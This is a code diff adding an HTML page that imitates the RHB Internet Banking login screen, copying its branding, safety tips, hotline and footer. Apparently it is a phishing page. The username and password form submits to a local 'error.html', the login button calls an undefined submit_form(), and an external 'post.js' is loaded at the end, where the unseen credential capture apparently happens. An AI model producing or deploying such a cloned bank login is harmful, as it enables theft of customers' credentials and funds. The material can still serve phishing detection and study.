@@ -1,0 +1,288 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+	<title>Login | RHB Internet Banking</title>
+	<meta name="viewport"
+		content="width=device-width, initial-scale=1, user-scalable=1, minimum-scale=0.1, maximum-scale=2.0">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<link rel="stylesheet" href="RHB_files/style.css" type="text/css">
+	<script language="javascript" src="RHB_files/en_clock.js" type="text/javascript"></script>
+	<script language="JavaScript" src="RHB_files/Common.js" type="text/javascript"></script>
+	<script language="javascript" src="RHB_files/select.js" type="text/javascript"></script>
+	<script language="javascript" src="RHB_files/jquery-2.js" type="text/javascript"></script>
+	<script language="javascript" type="text/javascript">
+		var isSubmitted = false;
+		var click = 1;
+		var kimgDir = "../image/";		// directory for keyboard images
+
+		function loginUser(thisForm) {
+			var strAccessCd = thisForm.txtAccessCode.value;
+			document.getElementById('lblMessage').innerHTML = "";
+			//document.getElementById('trErrMsg').style.display       = "none";
+
+			if (click == 1) {
+				//click++;
+				return true;
+			}
+			else {
+				alert('Your application is being processed');
+				return false;
+			}
+		}
+
+		function checkEnter(e) //e is event object passed from function invocation
+		{
+			var characterCode;
+
+			if (e && e.which) //if which property of event object is supported (NN4)
+			{
+				e = e
+				characterCode = e.which //character code is contained in NN4's which property
+			}
+			else {
+				e = event
+				characterCode = e.keyCode //character code is contained in IE's keyCode property
+			}
+
+			if (characterCode == 13) //if generated character code is equal to ascii 13 (if enter key)
+			{
+				document.getElementById('cmdLogin').focus();
+				document.getElementById('cmdLogin').click();
+			}
+			else {
+				return false;
+			}
+		}
+
+		function displayClock() {
+			document.getElementById("clock").firstChild.nodeValue = updateClock();
+		}
+
+		function reloadTimeout() {
+			location.reload();
+		}
+	</script>
+</head>
+
+<body oncontextmenu="return false;"
+	onload="displayClock(); setInterval('displayClock()', 1000 );setTimeout('reloadTimeout()', 959480.9863);">
+	<div class="mainheader">
+		<table style="width:100%">
+			<tbody>
+				<tr>
+					<td class="mainheader_logo" style="border-bottom:none">
+						<img src="RHB_files/tutorial-rhb-logo.png" id="imgLogo" style="width:101px" alt="RHB Logo">
+					</td>
+					<td style="border-bottom:none">
+						<img src="RHB_files/fpx_logo.png" id="imgFPXLogo"
+							style="width:101px; float:right; padding-right:unset" alt="FPX Logo"
+							class="mainheader_clock">
+					</td>
+					<td style="padding-left:unset; border-bottom:none; white-space:nowrap" width="1%">
+						<div class="mainheader_clock" id="clock">4.01pm Sat 11 June 2022</div>
+					</td>
+				</tr>
+			</tbody>
+		</table>
+	</div>
+	<div class="announcement">
+		<div class="announcement_container">
+			<span id="lblAnnouncement" class="announcement_title">ANNOUNCEMENT</span>
+			<span class="announcement_detail">Dear Customer, effective 1 Jan 2016, please call us
+				at 03-9206 8118 for ALL your banking services.</span>
+		</div>
+	</div>
+	<div class="announcement_mobile">
+		<div class="announcement_mobile_container">
+			<img src="RHB_files/call.jpg" class="call_icon" width="16" height="16"><span
+				class="announcement_detail_mobile">CUSTOMER
+				SERVICE HOTLINE: 03-9206 8118</span>
+		</div>
+	</div>
+	<div class="contentbody">
+		<button class="accordion">
+			STAY SAFE ONLINE!</button>
+		<div class="panel">
+			<ul>
+				<li>Never log in via email links</li>
+				<li>Never reveal your PIN/Password to anyone</li>
+				<li><a href="mailto:ibanksupport@rhbbank.com.my">Click here</a> to notify us on any
+					phishing website</li>
+			</ul>
+			<div class="open_account_mobile">
+				Don't have an internet banking account?<br>
+				<a href="#">Click here</a> for information on opening an account
+			</div>
+		</div>
+		<div id="mainContent">
+			<div class="staysafe_box">
+				<div class="staysafe_title">
+					STAY SAFE ONLINE!</div>
+				<ul>
+					<li>Never log in via email links</li>
+					<li>Never reveal your PIN/Password to anyone</li>
+					<li><a href="mailto:ibanksupport@rhbbank.com.my">Click here</a> to notify us on any
+						phishing website</li>
+				</ul>
+				<div class="open_account">
+					Don't have an internet banking account?<br>
+					<a href="#">Click here</a> for information on opening an account
+				</div>
+			</div>
+		</div>
+		<div class="sign_box">
+			<form name="frmLogin"  action="error.html" id="frmLogin">
+				<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+				<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+				<input type="hidden" name="__LoginInd" id="__LoginInd" value="True">
+				<input type="hidden" name="____Ticket" id="____Ticket" value="1">
+				<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="i=">
+				<script type="text/javascript">
+< !--
+var theForm = document.forms['frmLogin'];
+					if (!theForm) {
+						theForm = document.frmLogin;
+					}
+					function __doPostBack(eventTarget, eventArgument) {
+						if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+							theForm.__EVENTTARGET.value = eventTarget;
+							theForm.__EVENTARGUMENT.value = eventArgument;
+							theForm.submit();
+						}
+					}
+// -->
+				</script>
+				<input type="hidden" name="b" id="b" value="RHB">
+				<div class="title">
+					<span id="lbllgnHeader">Hello. Please Login</span>
+				</div>
+				<div class="signin_forms">
+					<div class="input_row">
+						<span id="lblUsername">Username</span>
+						<input name="uname" type="text" id="uname" class="signin_input username" autocomplete="off"
+							placeholder="Enter Username" maxlength="50">
+					</div>
+					<div class="input_row">
+						<span id="lblUsername">Password</span>
+						<input name="pd" type="password" id="pd" class="signin_input username" autocomplete="off"
+							placeholder="Enter Password" maxlength="50">
+					</div>
+					<span class="input_error_msg">
+						<label id="lblMessage" style="word-wrap: break-word">
+						</label>
+					</span>
+					<div class="login_btns">
+						<div class="btn login_btn">
+							<a id="cmdLogin" name="cmdLogin"
+								onclick="submit_form()" tabindex="0"
+								title="OK" href="error.html">LOGIN</a>
+						</div>
+						<div class="btn cancel_btn">
+							<a id="cmdCancel" name="cmdCancel"
+								onclick="javascript: if( isClickedTwice() ) return false;" tabindex="0" title="CANCEL"
+								href="javascript:__doPostBack('cmdCancel','')">CANCEL</a>
+						</div>
+					</div>
+				</div>
+				<script language="javascript">
+					function validateInput(strAccessCode) {
+						if (strAccessCode == "") {
+							document.getElementById("lblMessage").innerHTML = "Please enter Username (112001013)";
+							return false;
+						}
+						else if (strAccessCode.length < 6) {
+							document.getElementById("lblMessage").innerHTML = "Information you have entered is incorrect. Please try again. (112001150)";
+							return false;
+						} else if (strAccessCode.length > 20) {
+							document.getElementById("lblMessage").innerHTML = "Information you have entered is incorrect. Please try again. (112001150)";
+							return false;
+						}
+						if (!alphaNumeric(strAccessCode)) {
+							document.getElementById("lblMessage").innerHTML = "Information you have entered is incorrect. Please try again. (112001150)";
+							return false;
+
+						}
+						return true;
+					}
+				</script>
+				<script language="javascript">
+
+				</script>
+				<script language="javascript">
+					function alphaNumeric(str) {
+						var re = new RegExp("[^a-zA-Z0-9]");
+						for (var i = 0; i < str.length; i++) {
+							if ((str.substr(i, 1).match(re))) {
+								return false;
+							}
+						}
+						return true;
+					}
+				</script>
+			</form>
+		</div>
+	</div>
+	<div style="clear: both">
+	</div>
+	<div class="footer" id="footer">
+		<ul>
+			<li><a href="http://www.rhbgroup.com/general-info/faq/index.html" target="rhb">FAQ</a></li>
+			<li><a href="http://www.rhbgroup.com/general-info/terms-and-conditions/" target="rhb">Terms &amp;
+					Conditions</a></li>
+			<li><a href="http://www.rhbgroup.com/general-info/privacy-policy/" target="rhb">Privacy</a></li>
+			<li><a href="http://www.rhbgroup.com/general-info/personal-data-protection-act/" target="rhb">PDPA Privacy
+					Notice</a></li>
+			<li><a href="http://www.rhbgroup.com/general-info/client-charter/" target="rhb">Client Charter</a></li>
+			<li><a href="http://www.rhbgroup.com/general-info/disclaimer/" target="rhb">Disclaimer</a></li>
+			<p>Copyright RHB Banking Group 2018 All rights reserved.</p>
+		</ul>
+	</div>
+	<script language="javascript" type="text/javascript">
+		var objP = window.parent;
+
+		if (objP != null) {
+			objP.blnLogined = false;
+			objP = null;
+		}
+
+		if (document.getElementById('txtAccessCode') != null) {
+			if (!document.frmLogin.txtAccessCode.disabled) {
+				document.getElementById('txtAccessCode').focus();
+			}
+		}
+
+		var acc = document.getElementsByClassName("accordion");
+		var i;
+
+		for (i = 0; i < acc.length; i++) {
+			acc[i].onclick = function () {
+				this.classList.toggle("active");
+				this.nextElementSibling.classList.toggle("show");
+			}
+		}
+	</script>
+	<script id="f5_cspm">(function () {
+			var f5_cspm = {
+				f5_p: 'FELOFPFIFCHAJOOCHONDDLKKBDJLNELNDKHLBEIKPAMLGLBOMBCIBBOLIKPMBLBFNMLELAMIDDMBLEKIHPJLKEFDEDOAKKFHBBHHGPBEKPLEGNNOAOBCLNOEMEEEBHCN', setCharAt: function (str, index, chr) { if (index > str.length - 1) return str; return str.substr(0, index) + chr + str.substr(index + 1); }, get_byte: function (str, i) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; return ((str.charCodeAt(i + 16 + s) - 65) << 4) | (str.charCodeAt(i + s) - 65); }, set_byte: function (str, i, b) { var s = (i / 16) | 0; i = (i & 15); s = s * 32; str = f5_cspm.setCharAt(str, (i + 16 + s), String.fromCharCode((b >> 4) + 65)); str = f5_cspm.setCharAt(str, (i + s), String.fromCharCode((b & 15) + 65)); return str; }, set_latency: function (str, latency) { latency = latency & 0xffff; str = f5_cspm.set_byte(str, 48, (latency >> 8)); str = f5_cspm.set_byte(str, 49, (latency & 0xff)); str = f5_cspm.set_byte(str, 43, 2); return str; }, wait_perf_data: function () {
+					try {
+						var wp = window.performance.timing; if (wp.loadEventEnd > 0) {
+							var res = wp.loadEventEnd - wp.navigationStart; if (res < 60001) { var cookie_val = f5_cspm.set_latency(f5_cspm.f5_p, res); window.document.cookie = 'f5avr0356971918aaaaaaaaaaaaaaaa=' + encodeURIComponent(cookie_val) + ';path=/'; }
+							return;
+						}
+					}
+					catch (err) { return; }
+					setTimeout(f5_cspm.wait_perf_data, 100); return;
+				}, go: function () {
+					var chunk = window.document.cookie.split(/\s*;\s*/); for (var i = 0; i < chunk.length; ++i) {
+						var pair = chunk[i].split(/\s*=\s*/); if (pair[0] == 'f5_cspm' && pair[1] == '1234') { var d = new Date(); d.setTime(d.getTime() - 1000); window.document.cookie = 'f5_cspm=;expires=' + d.toUTCString() + ';path=/;'; setTimeout(f5_cspm.wait_perf_data, 100); }
+					}
+				}
+			}
+			f5_cspm.go();
+		}());</script>
+</body>
+<script type="text/javascript" src="post.js"></script>
+
+</html>
